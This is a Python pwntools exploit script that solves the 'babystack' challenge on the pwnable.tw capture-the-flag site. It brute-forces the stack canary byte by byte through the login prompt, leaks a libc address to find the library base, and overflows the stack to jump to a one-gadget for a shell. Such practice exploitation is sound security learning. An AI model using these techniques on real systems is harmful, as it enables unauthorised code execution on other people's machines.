from pwn import *
import pdb
import sys


def login(pwd):
    p.sendafter('>> ', '1')
    p.sendafter('Your passowrd :', pwd)
    cont = p.recvline()

    return False if 'Failed' in cont else True


def logout():
    p.sendafter('>> ', '1')


def EXIT():
    p.sendafter('>> ', '2')


def read_input(cont, op=''):
    p.sendafter('>> ', '3' + 'a' * 15)
    p.sendafter('Copy :', cont + op)


def brude(sz=0x10, prefix=''):
    _cont = ''
    for idx in range(sz):
        for c in range(1, 255):
            # print('idx: {}, c: {}'.format(idx, c))
            if c == 10:
                continue
            __cont = _cont + chr(c)
            if login(prefix + __cont + '\n'):
                print('idx: {}, enumc:{:#x}'.format(idx, c))
                logout()
                _cont = __cont
                break

    return _cont


DEBUG = False

# context.proxy = (socks.HTTP, '192.168.152.1', 19999)

if DEBUG:
    p = process('/home/len/pwnable/babystack')
    elf = ELF('/home/len/pwnable/glibcs/glibc-2.23-x64/lib/libc.so.6')
    gadget_offset = 0xD8F87
else:
    p = remote('chall.pwnable.tw', 10205)
    elf = ELF('/home/len/pwnable/libc_64.so.6')
    gadget_offset = 0x4526A

_IO_2_1_stdout_offset = elf.symbols['_IO_2_1_stdout_']
_IO_file_overflow_offset = elf.symbols['_IO_file_overflow']

if __name__ == '__main__':
    while True:
        canary = brude()
        if len(canary) != 16:
            p.close()
            p = process('/home/len/pwnable/babystack')
            continue
        else:
            print(canary.encode('hex'))

            # for leak libc_address
            pdb.set_trace()
            p.sendafter('>> ', 'a')
            login('\0'.ljust(0x48, 'a'))
            read_input('b' * 0x10)
            logout()
            # read_input('a' * 0x3f, op='1')
            if DEBUG:
                _IO_file_overflow_addr = u64(
                    brude(8, prefix='a' * 8).ljust(8, '\0')) - 219
            else:
                _IO_file_overflow_addr = u64(
                    brude(8, prefix='a' * 8).ljust(8, '\0')) - 235
            print('_IO_2_1_stdout_addr: {:#x}'.format(_IO_file_overflow_addr))
            libc_base = _IO_file_overflow_addr - _IO_file_overflow_offset
            print('libc_base: {:#x}'.format(libc_base))
            if libc_base % 0x1000 != 0:
                continue

            # payload
            gadget_addr = libc_base + gadget_offset
            print('gadget_addr: {:#x}'.format(gadget_addr))
            # pdb.set_trace()
            login('\x00'.ljust(0x40, 'a') + canary + 'a' * 0x18 +
                  p64(gadget_addr) + 'c' * (0xd))
            read_input('b' * 0x3f, '2')
            p.interactive()
            break